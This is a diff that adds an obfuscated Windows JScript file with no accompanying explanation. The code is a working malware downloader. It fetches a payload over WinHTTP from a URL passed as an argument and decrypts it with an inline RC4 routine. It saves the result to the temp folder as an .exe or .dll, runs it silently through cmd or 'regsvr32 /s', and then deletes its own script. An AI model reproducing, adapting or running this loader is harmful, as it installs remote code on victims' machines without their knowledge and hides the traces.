@@ -1,0 +1,52 @@
+var y = function(i) {
+  return ("WinHTTP,Request.5.1,GET,Scripting.FileSystemObject,WScript.Shell,ADODB.Stream,Arguments,.exe,GetTempName,charCodeAt,iso-8859-1,,indexOf,.dll,ScriptFullName,join")["split"](",")[i]
+};
+
+function o(a) {
+  return new ActiveXObject(a)
+};
+try {
+  var x = WScript,
+    q = o(y(3)),
+    m = x[y(6)],
+    j = o(y(4)),
+    s = o(y(5)),
+    p = y(7),
+    n = 0,
+    w1 = x[y(14)],
+    v = y(9);
+  j.CurrentDirectory = q.GetSpecialFolder(2);
+  s.Type = 2;
+  c = q[y(8)]();
+  s.Charset = y(10);
+  s.Open();
+  i = wl(m);
+  d = i[v](i[y(12)]("PE  ") + 23);
+  s["WriteText"](i);
+  if (31 < d) {
+    var z = 1;
+    c += y(13)
+  } else c += p;
+  s["SaveToFile"](c, 2);
+  s.Close();
+  z && (c = "regsvr32" + p + " /s " + c);
+  console.log("cmd" + p + " /c " + c);
+  j.run("cmd" + p + " /c " + c, 0)
+} catch (w0) {}
+q["deleteFile"](w1);
+
+function wl(g) {
+  var k = o(y(0) + "." + y(0) + y(1));
+  k.setProxy(n);
+  k.open(y(2), g(1), n);
+  k.Option(0) = g(2);
+  k.send();
+  if (200 == k.status) return de(k["responseText"], g(n))
+};
+
+function de(u, g) {
+  for (var c = 0, d, b = [], h = [], a = 0; 256 > a; a++) b[a] = a;
+  for (a = 0; 256 > a; a++) c = c + b[a] + g[v](a % g.length) & 255, d = b[a], b[a] = b[c], b[c] = d;
+  for (var e = c = a = 0; e < u.length; e++) a = a + 1 & 255, c = c + b[a] & 255, d = b[a], b[a] = b[c], b[c] = d, h.push(String.fromCharCode(u[v](e) ^ b[b[a] + b[c] & 255]));
+  return h[y(15)](y(11))
+};
